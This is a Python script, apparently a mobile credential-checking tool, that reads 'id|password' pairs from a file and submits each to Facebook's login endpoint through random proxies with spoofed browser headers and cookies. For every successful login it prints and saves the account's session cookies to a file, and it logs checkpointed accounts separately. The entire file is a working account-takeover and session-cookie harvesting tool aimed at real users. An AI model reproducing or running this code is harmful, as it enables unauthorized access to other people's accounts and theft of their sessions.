import os, time, random, re, sys, requests

oks, cps, bkas = [], [], []
loop = 0

try:
    xvx = open('/sdcard/proxy.txt', 'r').read().splitlines()
except:
    xvx = ["http://127.0.0.1:8080"]

logo_text = "🔐 Facebook Login Tool (One ID at a time) 🔐"
linex = lambda: print('-' * 50)
check_lock = lambda cid: "live"

os.system('clear')
print(logo_text)

dfile = input('\n📄 ENTER FILE PATH (e.g., sdcard/mahadi.txt): ')
try:
    dx = open(dfile, 'r').read().splitlines()
except FileNotFoundError:
    print('❌ FILE NOT FOUND...')
    time.sleep(1)
    sys.exit()

if not dx:
    print('❌ FILE IS EMPTY...')
    time.sleep(1)
    sys.exit()

for user in dx:
    os.system('clear')
    print(logo_text)
    print("📲 TOTAL ID : 1")
    print("🔄 PROCESSING ONE ID...")
    linex()
    try:
        ids, pw = user.split('|')
        ids, pw = ids.strip(), pw.strip()
    except:
        continue
    sys.stdout.write(f"\r ⏳ () ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
    sys.stdout.flush()
    try:
        nip = random.choice(xvx)
        proxs = {'http': nip}
        Session = requests.Session()
        free_fb = Session.get('https://touch.facebook.com').text
        data = {
        'email': ids,
        'cuid': '',
        'guid': 'f99704105df093dd0',
        'lgnjs': '1786642260',
        'lgnrnd': '103059_2xLj',
        'locale': 'hi_IN',
        'login_source': 'comet_login_header',
        'next': 'https://www.facebook.com/watch',
        'skstamp': '',
        'timezone': '-330',
        'prefill_contact_point': '',
        'prefill_source': '',
        'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
        'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
        'lgndim': 'eyJ3IjoxNjgwLCJoIjoxMDUwLCJhdyI6MTY4MCwiYWgiOjEwNTAsImMiOjI0fQ==',
        'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
        'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
        cookies = {
        'datr': 'WDxoakUoKsgNSfEPoU81xqVu',
        'sb': 'WDxoapiP73OCuxpZnfPFk97U',
        'locale': 'hi_IN',
        'fr': '0XIWEirsGdY8SJOuR..Bqawvz..AAA.0.0.Bqff9P.AWdzvkqtTFsCe7F9Z_WeUuJ4KR8',
        'wd': '1189x779',}
        headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'priority': 'u=0, i',
        'referer': 'https://www.facebook.com/watch',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Google Chrome";v="151.0.0.0", "Chromium";v="151.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',}
        url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
        response = Session.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False)
        cookie_data = Session.cookies.get_dict()
        if "c_user" in cookie_data:
            cid = cookie_data["c_user"]
            coki = ";".join([f"{k}={v}" for k, v in cookie_data.items()])
            print(f"\n✅ DONE: {cid}|{pw}")
            print(f"🍪 Cookie: {coki}")
            open("/sdcard/NEW-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
            oks.append(cid)
        elif 'checkpoint' in cookie_data:
            print(f"\n⚠️ CHECKPOINT: {ids}|{pw}")
            open('/sdcard/NEW-FAIL.txt', 'a').write(f'{ids}|{pw}\n')
            cps.append(ids)
        else:
            print("\n❌ FAIL: Login not successful.")
    except Exception as e:
        print(f"\n⚠️ ERROR: {e}")
        time.sleep(2)
    loop += 1
    linex()
    print(f"🔍 Response Code: {response.status_code}")  # <-- Added response code print
    print("🔚 PROCESS COMPLETE.")
    linex()
    input("➡️ PRESS ENTER TO LOGIN NEXT ID...")
